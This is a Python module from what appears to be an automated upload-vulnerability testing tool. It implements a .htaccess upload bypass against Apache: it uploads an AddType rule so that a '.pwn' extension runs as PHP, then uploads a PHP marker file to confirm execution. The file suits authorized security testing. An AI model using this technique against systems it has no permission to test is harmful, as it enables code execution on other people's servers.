import re
import sys
import os
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from strategies.base import Strategy, StrategyStatus
from models.observation import Observation, ObservationType, ConfidenceLevel

class HtaccessUploadStrategy(Strategy):
    """
    Bypass extension filters by uploading a .htaccess file (Apache ONLY)
    """
    
    name = "htaccess_upload"
    description = "Bypass filters by uploading .htaccess to redefine PHP execution"
    confidence_gain = 0.95
    
    targets_hypotheses = [
        "apache_webserver",
        "weak_extension_check"
    ]
    
    def __init__(self, uploader, fetcher, observer, base_url: str):
        self.uploader = uploader
        self.fetcher = fetcher
        self.observer = observer
        self.base_url = base_url.rstrip('/')
    
    def applicable(self, context) -> bool:
        # Only applies to Apache
        if context.tech_stack and context.tech_stack.web_server:
            if "apache" in context.tech_stack.web_server.lower():
                return True
        return False

    def execute(self, context) -> StrategyStatus:
        print("      [*] Attempting .htaccess upload...")
        
        filename = ".htaccess"
        # Redefine .pwn extension to be parsed as PHP
        payload = b"AddType application/x-httpd-php .pwn"
        
        try:
            upload_response = self.uploader.upload(filename, payload)
            
            if upload_response.status_code == 200:
                print(f"      [+] .htaccess uploaded successfully!")
                
                # Now upload the exploit with the new extension
                exploit_filename = "exploit.pwn"
                exploit_payload = b"<?php echo 'VULNERABLE'; ?>"
                
                print(f"      [*] Uploading {exploit_filename}...")
                final_upload = self.uploader.upload(exploit_filename, exploit_payload)
                
                if final_upload.status_code == 200:
                    print(f"      [+] {exploit_filename} accepted! Vulnerability confirmed.")
                    return StrategyStatus.SUCCESS
                    
            return StrategyStatus.FAILURE
            
        except Exception as e:
            print(f"      [!] Error: {e}")
            return StrategyStatus.FAILURE
